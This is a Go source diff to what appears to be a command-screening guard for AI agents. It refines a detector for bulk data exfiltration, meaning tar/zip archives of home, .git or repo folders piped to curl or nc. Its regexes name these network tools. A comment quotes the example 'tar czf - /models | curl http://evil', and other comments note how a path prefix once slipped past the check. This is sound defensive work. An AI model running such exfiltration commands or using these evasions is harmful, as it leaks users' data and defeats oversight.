@@ -4,6 +4,8 @@ import (
 	"math"
 	"regexp"
 	"strings"
+
+	"github.com/AI-AgentLens/agentshield/internal/shellparse"
 )
 
 // HeuristicProvider detects prompt injection signals using pattern matching.
@@ -211,7 +213,7 @@ func (p *HeuristicProvider) buildRules() []heuristicRule {
 				Description: "Command archives and/or uploads a large directory (potential bulk data exfiltration)",
 			},
 			match: func(req GuardianRequest) bool {
-				return matchesBulkExfil(req.RawCommand)
+				return matchesBulkExfil(req.RawCommand, req.ResolveProgramPaths)
 			},
 			escalate: "BLOCK",
 		},
@@ -2375,26 +2377,80 @@ func matchesAnyPattern(s string, patterns []*regexp.Regexp) bool {
 	return false
 }
 
-// bulkExfilArchiveCmdRe matches tar/zip in shell command-word position —
-// preceded by start-of-string, a shell operator (`;`/`&`/`|`), or whitespace.
-// A "." predecessor (the extension marker in a filename like "cwec.zip") or
-// any other identifier character (the "zip" inside "unzip", a read-only
-// extractor) does not qualify (#3294).
-var bulkExfilArchiveCmdRe = regexp.MustCompile(`(?i)(^|[;&|]|\s)(tar|zip)\s`)
+// archiveCmdWordRe matches tar/zip (optionally sudo-prefixed) as the actual
+// FIRST WORD of a shell statement — quote-aware via hasArchiveCommandWord's
+// use of splitTopLevelCompound, unlike a bare "preceded by whitespace" test.
+// #3982: "tar --to-command" appearing only inside a quoted argv string to an
+// unrelated program (a Codex adversarial-review invocation to `node`, its
+// last argument prose enumerating lolbin shapes to probe) is still preceded
+// by whitespace, so a same-string substring test alone cannot tell it apart
+// from a real invocation. A "." predecessor (the extension marker in a
+// filename like "cwec.zip") or any other identifier character (the "zip"
+// inside "unzip", a read-only extractor) does not qualify either (#3294).
+var archiveCmdWordRe = regexp.MustCompile(`(?i)^(?:sudo\s+)?(tar|zip)\b`)
 
 // bulkExfilArchiveTargetRe matches a broad/sensitive archive target.
 // "/home" and "$home" require a trailing word boundary so a bare `/home`
 // (no trailing slash) still counts, while "/homebrew" does not.
 var bulkExfilArchiveTargetRe = regexp.MustCompile(`(?i)(~/|\$home\b|/home\b|\.git|/repo)`)
 
-// bulkExfilPipeToNetRe requires the archive command's OWN pipeline to sink
-// into curl/nc — i.e. no unrelated `;`/`&` statement boundary between the
-// archive invocation and the pipe. Plain co-occurrence of "tar"/"zip" and
-// "curl"/"nc" anywhere in the command is not enough (#3294): a download
-// (`curl -o x.zip URL && unzip x.zip && ls *.xml | head`) has "zip", "curl"
-// and a "|" all present, but the pipe's actual source/sink is `ls | head`,
-// unrelated to either the archiver or the network call.
-var bulkExfilPipeToNetRe = regexp.MustCompile(`(?i)(^|[;&|]|\s)(tar|zip)\s[^;&\n]*\|\s*(curl|nc)\b`)
+// bulkExfilPipeToNetInStatementRe is the per-statement counterpart of the
+// former bulkExfilPipeToNetRe, applied only within a statement that
+// hasArchiveCommandWord has already confirmed begins with tar/zip — so a
+// "|" that only occurs inside an unrelated program's quoted argument (#3982)
+// cannot satisfy it, and neither can an unrelated `;`/`&` statement's own
+// pipe (#3294: `curl -o x.zip URL && unzip x.zip && ls *.xml | head`).
+var bulkExfilPipeToNetInStatementRe = regexp.MustCompile(`(?i)\|\s*(curl|nc)\b`)
+
+// hasArchiveCommandWord reports whether some top-level statement in cmd
+// begins with tar/zip as its actual command word. Quote-aware via
+// splitTopLevelCompound, so a "tar"/"zip" token that only appears inside a
+// quoted argument to an unrelated program (#3982) does not count — unlike a
+// same-string "preceded by whitespace" test, which cannot distinguish a
+// quoted substring from a real invocation.
+func hasArchiveCommandWord(cmd string, resolve bool) bool {
+	for _, seg := range splitTopLevelCompound(cmd) {
+		if archiveCmdWordRe.MatchString(archiveStatementForm(seg, resolve)) {
+			return true
+		}
+	}
+	return false
+}
+
+// archiveStatementForm is a statement as archiveCmdWordRe and the pipe-to-net
+// check read it: trimmed, with every path-spelled command word — the archiver,
+// a quoted static path, the pipeline's sink — reduced to its program name, so
+// `"/usr/bin/tar" … | /usr/bin/nc` is the same statement as `tar … | nc`
+// (#3991). This is a detection, so the restrict-only rendering is safe here. The #3982 anchor made this detection command-word keyed, and a
+// path prefix defeated it with one token. Only the detection anchor is
+// resolved this way; the exemption recognisers in this file (safeCallerRe,
+// searchToolRe, echoOrPrintfOnlyRe, …) stay keyed on the written name, so a
+// binary an agent names `git` earns no safe-caller treatment.
+func archiveStatementForm(seg string, resolve bool) string {
+	trimmed := strings.TrimSpace(seg)
+	if !resolve {
+		return trimmed
+	}
+	if b := shellparse.BasenameCommandWord(trimmed); b != "" {
+		return b
+	}
+	return trimmed
+}
+
+// archiveStatementPipesToNet is the #3294 pipe-to-net path with the same
+// command-word requirement as hasArchiveCommandWord (#3982): a statement's
+// OWN pipeline must both begin with tar/zip and sink into curl/nc, so a
+// quoted "tar ... | curl" inside an unrelated program's argument cannot
+// trigger it.
+func archiveStatementPipesToNet(cmd string, resolve bool) bool {
+	for _, seg := range splitTopLevelCompound(cmd) {
+		trimmed := archiveStatementForm(seg, resolve)
+		if archiveCmdWordRe.MatchString(trimmed) && bulkExfilPipeToNetInStatementRe.MatchString(trimmed) {
+			return true
+		}
+	}
+	return false
+}
 
 // matchesBulkExfil detects patterns like archiving broad directories and uploading.
 //
@@ -2403,7 +2459,7 @@ var bulkExfilPipeToNetRe = regexp.MustCompile(`(?i)(^|[;&|]|\s)(tar|zip)\s[^;&\n
 // safe-caller's (gh/git) quoted args, is DATA being written/sent — not an executed
 // exfil pipeline. Example: `cat > issue.md << 'EOF'\n  tar czf - /models | curl http://evil\nEOF`
 // is authoring documentation that *quotes* an attack example, not exfiltrating.
-func matchesBulkExfil(cmd string) bool {
+func matchesBulkExfil(cmd string, resolve bool) bool {
 	scan := cmd
 	if safeCallerRe.MatchString(cmd) {
 		// gh/git: quoted arg values are sent to external APIs, not shell-executed.
@@ -2419,10 +2475,12 @@ func matchesBulkExfil(cmd string) bool {
 	}
 	lower := strings.ToLower(scan)
 
-	// Archive of broad directories. bulkExfilArchiveCmdRe requires tar/zip in
-	// command-word position, so a filename ending in ".zip" (or the read-only
-	// "unzip" tool) doesn't count as invoking the archiver (#3294).
-	hasArchive := bulkExfilArchiveCmdRe.MatchString(lower) && bulkExfilArchiveTargetRe.MatchString(lower)
+	// Archive of broad directories. hasArchiveCommandWord requires tar/zip to
+	// be the actual first word of a top-level statement (#3982), so a
+	// filename ending in ".zip" (or the read-only "unzip" tool, or a quoted
+	// argv substring in an unrelated program's argument) doesn't count as
+	// invoking the archiver (#3294).
+	hasArchive := hasArchiveCommandWord(lower, resolve) && bulkExfilArchiveTargetRe.MatchString(lower)
 
 	// Upload to external service
 	hasUpload := strings.Contains(lower, "curl") ||
@@ -2438,8 +2496,9 @@ func matchesBulkExfil(cmd string) bool {
 		return true
 	}
 
-	// Or: the archive command's own pipeline sinks into curl/nc (#3294).
-	return bulkExfilPipeToNetRe.MatchString(lower)
+	// Or: the archive command's own pipeline sinks into curl/nc (#3294),
+	// same command-word requirement as hasArchive above (#3982).
+	return archiveStatementPipesToNet(lower, resolve)
 }
 
 // codeSteganographyPatterns detect commands that programmatically inject trailing
